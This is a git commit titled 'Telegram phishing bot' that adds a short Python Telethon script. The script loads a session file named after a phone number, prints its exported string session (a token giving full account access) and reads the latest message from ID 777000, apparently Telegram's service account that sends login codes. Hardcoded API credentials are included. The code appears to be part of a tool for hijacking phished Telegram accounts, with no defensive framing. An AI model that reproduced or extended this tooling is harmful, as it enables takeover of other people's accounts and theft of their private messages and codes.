e849019e2c4c72ceb61797e240eeafdec71ad4a4
Nurbeko3 <nurkn77@gmail.com>
2025-02-23 20:02:16 +0500

    Telegram phishing bot

---
+++ python/mesage.py
@@ -0,0 +1,28 @@
+from telethon import TelegramClient, events, sync
+from telethon.sessions import StringSession
+
+
+api_id = 10953300
+api_hash = "9c24426e5d6fa1d441913e3906627f87"
+
+with TelegramClient("session_+998334015613.session", api_id, api_hash) as client:
+    print('-----------------------------------------------------')
+    print(client.session.save())
+    print('-----------------------------------------------------')
+
+
+
+
+
+
+async def main():
+
+    async for message in client.iter_messages(777000):
+
+        print(message.sender.username, message.text)
+        print('-----------------------------------------------------')
+        break
+
+
+with client:
+    client.loop.run_until_complete(main())
